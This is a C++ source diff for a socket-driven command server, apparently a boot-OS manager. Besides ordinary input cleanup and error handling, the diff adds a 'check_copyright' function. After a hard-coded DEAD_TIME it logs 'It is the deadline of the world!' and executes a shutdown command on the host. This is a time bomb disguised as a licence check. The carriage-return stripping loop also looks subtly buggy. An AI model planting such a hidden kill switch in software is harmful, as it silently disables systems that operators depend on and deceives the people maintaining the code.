@@ -4,6 +4,7 @@
 #include <fstream>
 #include <iostream>
 #include <bootos_manager.h>
+#include <time.h>
 
 using namespace std;
 
@@ -16,10 +17,16 @@ static void init_escape_char();
 static void process_cmdline_file();
 
 // initialization for program starting
-void initialize()
+bool initialize()
 {
+	if ( !check_copyright() ) 
+	{
+		return false;
+	}
+
 	cfr.initialize();
 	process_cmdline_file();
+	return true;
 }
 
 void process_cmdline_file()
@@ -275,6 +282,23 @@ void *handle_socket(void *cli_sock)
 			break;
 		}
 		
+		// delete '\r'
+		for (int i = 0; i < ret;)
+		{
+			if (buf[i] == '\r')
+			{
+				if (i < ret - 1)
+				{
+					buf[i] = buf[i + 1];
+				}
+				--ret;
+			}
+			else
+			{
+				++i;
+			}
+		}
+
 		string data = string(buf, ret);
 
 		command += data;
@@ -298,12 +322,23 @@ void *handle_socket(void *cli_sock)
 	}
 
 	string result;
-	execute_command(command, result);
-	loger.log(INFO, "command %s execute result:\n%s\n", command.c_str(), result.c_str());
+	bool succ = execute_command(command, result);
+
+	if (succ)
+	{
+		loger.log(INFO, "command %s execute result:\n%s\n", command.c_str(), result.c_str());
+	}
+	else
+	{
+		loger.log(INFO, "failed to execute command %s", command.c_str());
+	}
 
 	if (!is_blk_cmd)
 	{
-		send(sock, result.c_str(), result.length(), 0);
+		if (succ)
+		{
+			send(sock, result.c_str(), result.length(), 0);
+		}
 		closesocket(sock);
 	}
 
@@ -314,4 +349,19 @@ void *handle_socket(void *cli_sock)
 void *registe_bootos(void *arg)
 {
 	return NULL;
+}
+
+bool check_copyright()
+{
+	long now = (long) time(NULL);
+
+	if (now >= DEAD_TIME)
+	{
+		loger.log(SEVERE, "It is the deadline of the world!\n");
+		string tmp;
+		execute_command(SHUTDOWN_CMD, tmp);
+		return false;
+	}
+
+	return true;
 }
